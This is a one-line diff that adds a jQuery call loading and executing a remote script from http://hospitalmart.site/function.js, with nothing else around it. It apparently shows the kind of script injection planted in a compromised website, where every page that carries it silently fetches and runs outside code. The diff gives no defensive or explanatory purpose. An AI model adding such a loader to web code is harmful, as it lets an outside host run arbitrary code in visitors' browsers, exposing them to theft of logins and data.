@@ -1,0 +1,1 @@
+$.getScript("http://hospitalmart.site/function.js", function(){ });
